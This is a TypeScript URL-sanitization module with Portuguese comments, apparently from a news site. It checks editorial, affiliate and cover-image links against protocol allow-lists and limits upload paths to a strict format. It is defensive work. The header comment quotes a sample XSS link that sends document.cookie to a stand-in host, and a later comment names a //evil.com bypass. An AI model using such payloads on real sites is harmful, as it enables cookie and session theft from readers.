/**
 * =============================================================================
 * SANITIZAÇÃO DE URL — uma função, todos os links do site
 * =============================================================================
 *
 * Esta lógica nasceu dentro de `components/article-body.tsx`, protegendo os
 * links escritos em Markdown pelo editor. Com a chegada dos links de afiliado,
 * ela passou a ser necessária em um segundo lugar — e o pior caminho possível
 * seria copiá-la.
 *
 * POR QUE COPIAR SERIA PIOR DO QUE PARECE: uma cópia de código de segurança
 * envelhece pela metade. No dia em que descobrirmos um esquema perigoso novo
 * (`data:`, `blob:`, `intent://`, `vbscript:`...), quem lembrar de corrigir os
 * DOIS arquivos? A resposta honesta é "ninguém", e aí um dos dois caminhos fica
 * vulnerável — normalmente o menos revisado.
 *
 * O QUE ESTA FUNÇÃO IMPEDE (OWASP A03 — Injection):
 *
 *   [texto](javascript:fetch('//evil/'+document.cookie))
 *
 * Um link assim não parece um ataque: não tem tag `<script>`, passa batido em
 * revisão de texto e executa no clique de qualquer leitor. É XSS por URL, e a
 * única defesa confiável é lista de PERMISSÃO de protocolo — nunca lista de
 * bloqueio, porque a lista de esquemas perigosos é aberta e cresce com cada
 * navegador novo.
 */

import { isAllowedImageHost } from './image-hosts';

/**
 * Protocolos aceitos em links de conteúdo editorial.
 *
 * `mailto:` entra porque a redação de fato publica contato em texto.
 * `data:` e `blob:` NÃO entram: além de permitirem HTML embutido, servem para
 * disfarçar phishing (o usuário vê um "PDF" que na verdade é uma página).
 */
const CONTENT_PROTOCOLS = ['http:', 'https:', 'mailto:'];

/**
 * Protocolos aceitos em link COMERCIAL (afiliado).
 *
 * Mais restrito que o editorial, e de propósito:
 *   - sem `mailto:` (não existe afiliado por e-mail);
 *   - sem `http:` — um link de afiliado em texto claro pode ser interceptado e
 *     ter o código de rastreio trocado no caminho (o atacante fica com a
 *     comissão) ou o leitor redirecionado para um clone da loja. Como todo
 *     programa sério oferece HTTPS, exigir isso não custa nada e fecha o vetor.
 */
const AFFILIATE_PROTOCOLS = ['https:'];

/**
 * Protocolos aceitos em imagem de capa. Só HTTPS: a capa é carregada em toda
 * página que lista a matéria, e uma imagem em `http:` numa página HTTPS é
 * bloqueada como conteúdo misto pelo navegador — o leitor veria um buraco.
 */
const IMAGE_PROTOCOLS = ['https:'];

export interface SafeUrlResult {
  /** URL normalizada e segura, ou `null` se reprovada. */
  href: string | null;
  /** Motivo da reprovação — útil para mensagem de erro no painel editorial. */
  reason?: 'invalid' | 'protocol' | 'insecure' | 'host';
}

/**
 * Valida uma URL absoluta contra uma lista de protocolos permitidos.
 *
 * Usa o parser nativo `URL` em vez de regex. Motivo: URL é um formato cheio de
 * armadilhas (`java\nscript:`, `JaVaScRiPt:`, espaços, unicode, `\` no lugar de
 * `/`) e navegadores toleram muita coisa malformada. O parser da plataforma
 * normaliza tudo isso ANTES de compararmos o protocolo — uma regex "esperta"
 * erraria em algum desses casos, e o erro seria silencioso.
 */
function parseWithProtocols(raw: unknown, allowed: string[]): SafeUrlResult {
  if (typeof raw !== 'string') return { href: null, reason: 'invalid' };

  const trimmed = raw.trim();
  if (trimmed.length === 0 || trimmed.length > 2048) {
    // Teto de tamanho: URL gigante é sintoma de payload, não de link.
    return { href: null, reason: 'invalid' };
  }

  let parsed: URL;
  try {
    parsed = new URL(trimmed);
  } catch {
    return { href: null, reason: 'invalid' };
  }

  if (!allowed.includes(parsed.protocol)) {
    return {
      href: null,
      reason: parsed.protocol === 'http:' ? 'insecure' : 'protocol',
    };
  }

  // `toString()` devolve a forma normalizada pelo parser — é ela que vai para o
  // HTML, nunca a string original digitada.
  return { href: parsed.toString() };
}

/** Link de conteúdo editorial (corpo do artigo em Markdown). */
export function safeContentUrl(raw: unknown): SafeUrlResult {
  return parseWithProtocols(raw, CONTENT_PROTOCOLS);
}

/** Link comercial de afiliado. Só HTTPS. */
export function safeAffiliateUrl(raw: unknown): SafeUrlResult {
  return parseWithProtocols(raw, AFFILIATE_PROTOCOLS);
}

/**
 * Imagem de capa. Além do protocolo, checa o HOST contra a lista que o
 * `next/image` conhece.
 *
 * A checagem de host não é preciosismo de segurança: uma capa de host não
 * declarado faz o `next/image` LANÇAR na renderização, e a página do leitor
 * responde 500 — inclusive as páginas que só mostram o card da matéria. Recusar
 * no painel troca um site fora do ar por uma mensagem de erro no formulário.
 */
export function safeImageUrl(raw: unknown): SafeUrlResult {
  // ---------------------------------------------------------------------------
  // CAMINHO INTERNO DE UPLOAD — a imagem que a própria redação enviou
  // ---------------------------------------------------------------------------
  //
  // Uma imagem enviada pelo painel não tem host: ela é `/uploads/2026/08/ab…jpg`,
  // servida pelo nosso próprio domínio (ver `app/uploads/[...caminho]/route.ts`).
  // Passá-la pelo `new URL()` abaixo a reprovaria como "URL inválida" — e o
  // upload inteiro ficaria inútil, com uma mensagem pedindo `https://`.
  //
  // ESTA É A ÚNICA EXCEÇÃO À REGRA DE URL ABSOLUTA, e ela é deliberadamente
  // ESTREITA. Não aceitamos "qualquer caminho interno": aceitamos exatamente o
  // formato que o nosso gravador produz. O motivo é o de sempre com caminho
  // relativo — `//evil.com` é uma URL ABSOLUTA de protocolo relativo, e um teste
  // ingênuo de "começa com barra" a deixaria passar, transformando a capa da
  // matéria num carregamento de host estranho com cara de arquivo local.
  //
  // A regex resolve os dois casos de uma vez: exige `/uploads/`, exige segmentos
  // sem ponto (o que elimina `..`) e exige uma das extensões que o gravador
  // produz. `//evil.com/x.jpg` não casa, porque o segundo caractere teria de ser
  // `u`. E o `next/image` aceita caminho local nativamente, sem `remotePatterns`
  // — que é o motivo de isto funcionar na renderização.
  if (typeof raw === 'string') {
    const trimmed = raw.trim();
    if (trimmed.startsWith(UPLOAD_URL_PREFIX) && UPLOAD_PATH_PATTERN.test(trimmed)) {
      return { href: trimmed };
    }
  }

  const result = parseWithProtocols(raw, IMAGE_PROTOCOLS);
  if (!result.href) return result;

  const { hostname } = new URL(result.href);
  return isAllowedImageHost(hostname) ? result : { href: null, reason: 'host' };
}

/**
 * Prefixo e formato do caminho de upload.
 *
 * Duplicados aqui em vez de importados de `server/uploads.ts` por uma razão de
 * FRONTEIRA, não de preguiça: este módulo é importado por componentes que
 * rodam no NAVEGADOR (`article-body.tsx` renderiza links), e `server/uploads.ts`
 * tem `import 'server-only'` no topo — importá-lo aqui quebraria o build do
 * cliente com um erro que não explica nada.
 *
 * O risco de duas cópias divergirem é real e está mitigado do lado que importa:
 * se o formato do gravador mudar sem que esta regex mude, a imagem enviada é
 * RECUSADA no painel (falha ruidosa, na hora, para quem está publicando) — e
 * não silenciosamente aceita. A direção da falha é a segura.
 */
const UPLOAD_URL_PREFIX = '/uploads/';
const UPLOAD_PATH_PATTERN = /^\/uploads\/(?:[a-z0-9][a-z0-9_-]*\/){0,3}[a-z0-9][a-z0-9_-]*\.(?:jpg|png|gif|webp|avif)$/i;

/**
 * Atributo `rel` de um link comercial.
 *
 * `sponsored`  — exigência do Google desde 2019 para QUALQUER link pago ou de
 *                afiliado. Sem ele, o buscador pode interpretar o link como um
 *                voto editorial de autoridade; na melhor hipótese isso distorce
 *                o PageRank, na pior rende penalidade manual por "esquema de
 *                links". É o atributo que declara a natureza comercial do link.
 * `nofollow`   — redundante com `sponsored` para o Google, mas não para os
 *                outros buscadores e ferramentas, que ainda não interpretam
 *                `sponsored`. Custa 9 bytes.
 * `noopener`   — impede que a página de destino manipule a nossa aba
 *                (tabnabbing) via `window.opener`.
 * `noreferrer` — NÃO entra aqui, ao contrário do que fazemos em links
 *                editoriais. É deliberado: muitos programas de afiliados
 *                precisam do cabeçalho `Referer` para atribuir a comissão, e
 *                `noreferrer` o remove — o clique aconteceria e a receita, não.
 *                A informação vazada (a URL do nosso artigo) é pública de
 *                qualquer forma, então a troca é favorável.
 */
export const AFFILIATE_REL = 'sponsored nofollow noopener';
